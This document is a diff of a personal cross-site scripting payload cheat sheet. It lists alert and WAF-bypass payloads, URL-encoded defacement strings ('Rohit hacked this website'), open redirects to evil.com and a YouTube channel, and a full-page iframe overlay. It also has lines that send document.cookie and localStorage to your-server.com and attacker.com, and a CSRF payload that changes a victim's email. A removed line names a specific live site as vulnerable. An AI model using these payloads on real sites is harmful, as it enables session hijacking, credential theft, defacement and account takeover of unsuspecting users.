@@ -1,109 +1,73 @@
 Basic XSS:
        |
        |_ "><img src=x onerror=alert(document.domain) >
+	 '<IFRAME SRC="javascript:alert(document.cookie);">.jpg'
+	 '"><img src=x onerror=alert('evil')>.jpg'
+	 '"><img src=x onerror=alert(document.cookie)>.jpg'
+	 '<img src=x onerror=alert(document.cookie)>.png'
+	 '<img src=x onerror=alert(document.domain)>.jpg'
+	 '<img src=x onerror=alert(document.domain)>.png'
+	 '"><img src=x onerror=prompt(document.cookie)>.jpg'
+	 '<svg onload=alert(document.cookie)>.jpg'
+	 '<svg onload=alert(document.domain)>.jpg'
+	 '"><h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
+	 '<h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
+	 '">onmouseover=alert(1)'
+	  onmouseover="this.style.color='red'"
+	 <IFRAME SRC="javascript:alert(document.cookie);"></iframe>
+	 <button onClick="prompt(1337)"> Submit</button>
+	 <img src=x onerror=confirm(document.domain)>
+	 <svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
 
 ERROR based injection :
                    |
                    |_ '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
+		      '<font color="red">ERROR 1064 (42000): <h1>Rohith had made an error in your  Search Field;.jpg'
+		      '"><img src=x onerror="document.body.innerHTML += '<div style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);background-color:red;color:white;padding:20px;border-radius:10px;font-size:20px;z-index:9999;\'>ROHIT</div>';setTimeout(function(){document.querySelector('div').remove();}, 3000);">
 
-          <a href="https://www.ufrgs.br">login here</a>
-          <button onClick="prompt(1337)"> Submit</button>
-          <font color="red"> ERRO 1064(42000): You have na error in your SQL syntax;
-          <iframe src="https://www.ufrgs.br" style="border: 0; position:fixed; top:0; left:0; right:0; width:100%; height:100%">
-          <IFRAME SRC="javascript:alert(document.cookie);"></iframe>
-
-Open Redirect : SUBSCRIBE , LIKE & SHARE
+Open Redirect:
           |
-          |_ "><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
-	<a href="//evil.com">XSS</a>
-
-                               
-IMAGE INJECTION :
+          |_ "><img src=x onerror="window.location.href='http://www.evil.com';">
+	     <a href="//evil.com">LOGIN</a>
+	     <iframe src="http://www.evil.com" style="border: 0; position:fixed; top:0; left:0; right:0; width:100%; height:100%">
+                           
+IMAGE INJECTION:
             |
             |_ <img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
-
                "><img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
 
-
-CONSOLE LOG :
+CONSOLE LOG:
          |
          |_ <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
 
+WAF BYPASS:   DECODE/ENCODE SITE -> https://dencode.com/en/  
+	|
+	|_ "><img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+           "><iframe src="javascript:&#97&#108&#101&#114&#116(1)"></iframe>
+           "><script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
 
-						XSS Bypass Payloads Testing on LIVE TARAGET | POC
+	   XSS with Image Injection:
+		|
+	        |_%3Cimg%20src%3Dhttps%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%20%3E
+	           %3Cmarquee%3E%3Cimg%20src%3D%22https%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%22%20alt%3D%22GIF%22%3E%20Rohit%20is%20the%20real%20Mr.%20Robot%3C%2Fmarquee%3E%0D%0A
 
-XSS with Error Messages:)
+	   HTML:
+	     |
+             |_%3Cmarquee%3ERohit%20hacked%20this%20website%20using%20xss%3C%2Fmarquee%3E
+               %3Cmarquee%20style%3D%22font-family%3A%20%27Hack%27%2C%20monospace%3B%20color%3A%20green%3B%22%3ERohit%20hacked%20this%20website%20using%20XSS%3C%2Fmarquee%3E%0D%0A	
 
-    --> '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
+	   OPEN REDIRECT:
+            |
+            |_%3Cimg%20src%3Dx%20onerror%3D%22window.location.href%3D%27https%3A%2F%2Fwww.youtube.com%2F%40hackwithrohit-new-2k%27%3B%22%3E%0D%0A%0D%0A
 
-    --> '"><img src=x onerror="document.body.innerHTML += '<div style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);background-color:red;color:white;padding:20px;border-radius:10px;font-size:20px;z-index:9999;\'>ROHIT</div>';setTimeout(function(){document.querySelector('div').remove();}, 3000);">
-
-    --> '<font color="red">ERROR 1064 (42000): <h1>Rohith had made an error in your  Search Field;.jpg'
-
-
-XSS With Open redirect : )
-   -->  '"><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
-
-
-XSS with Image Injection :)
-
-
-   --> '"><img src=x onerror="document.body.innerHTML += '<img src=\'https://yt3.googleusercontent.com/igA5672w3ZWQcEe6OUE8q8-j4llVmEVftgq_EZBOGIva8GAnRmueug2nhUabrNZMH6FnDg6z=s160-c-k-c0x00ffffff-no-rj\' style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);z-index:9999;border:5px solid red;\'>';">
-
-Classic XSS Alert Payloads :)
-
-
-	'<IFRAME SRC="javascript:alert(document.cookie);">.jpg'
-
-	'"><img src=x onerror=alert('ROHIT')>.jpg'
-
-	'"><img src=x onerror=alert(document.cookie)>.jpg'
-
-	'<img src=x onerror=alert(document.cookie)>.png'
-
-	'<img src=x onerror=alert(document.domain)>.jpg'
-
-	'<img src=x onerror=alert(document.domain)>.png'
-
-	'"><img src=x onerror=prompt(document.cookie)>.jpg'
-
-	'<svg onload=alert(document.cookie)>.jpg'
-
-	'<svg onload=alert(document.domain)>.jpg'
-
-        '"><h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
-        '<h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
-	'">onmouseover=alert(1)'
-	onmouseover="this.style.color='red'"
+SEND DATA YOUR TO YOUR SERVER:
+	<img src=x onerror="fetch('https://your-server.com/log?cookie='+document.cookie)">
+	<script>navigator.sendBeacon('https://your-server.com/log', JSON.stringify(localStorage))</script>
+	<svg onload="(new Image).src='https://your-server.com/log?'+document.cookie">
+        <script>fetch('https://attacker.com/c='+document.cookie)</script>
 
 
-	XSS Bypass by Url Encoding
-
-Vulnerble : https://www.nobullproject.com/collections/shop?q=
-
-XSS with Image Injection :)
-
-%3Cimg%20src%3Dhttps%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%20%3E
-
-%3Cmarquee%3E%3Cimg%20src%3D%22https%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%22%20alt%3D%22GIF%22%3E%20Rohit%20is%20the%20real%20Mr.%20Robot%3C%2Fmarquee%3E%0D%0A
-
-Adding Marquee tag :)
-
-%3Cmarquee%3ERohit%20hacked%20this%20website%20using%20xss%3C%2Fmarquee%3E
-
-%3Cmarquee%20style%3D%22font-family%3A%20%27Hack%27%2C%20monospace%3B%20color%3A%20green%3B%22%3ERohit%20hacked%20this%20website%20using%20XSS%3C%2Fmarquee%3E%0D%0A
-
-To check HTMLI --> <i>test</i>
-
-open redirect 
-
-%3Cimg%20src%3Dx%20onerror%3D%22window.location.href%3D%27https%3A%2F%2Fwww.youtube.com%2F%40hackwithrohit-new-2k%27%3B%22%3E%0D%0A%0D%0A
-
-
-https://dencode.com/en/  
-
-
-                                       chain xss and htmli
+chain xss and htmli
 
 
 Create an Advanced Payload for Session Hijacking or Credential Theft:
@@ -117,7 +81,6 @@ Escalate the Attack to Simulate CSRF Actions:
 Craft a payload that submits unauthorized actions on behalf of the user. For example, simulate a form submission to change the user's profile information:
 
 <img src=x onerror="document.body.innerHTML+='<form id=\"csrf_form\" action=\"https://target.com/change-email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@malicious.com\"></form>'; document.getElementById('csrf_form').submit();">
-
 
 Example Payload for Combined HTML Injection and Persistent XSS
 
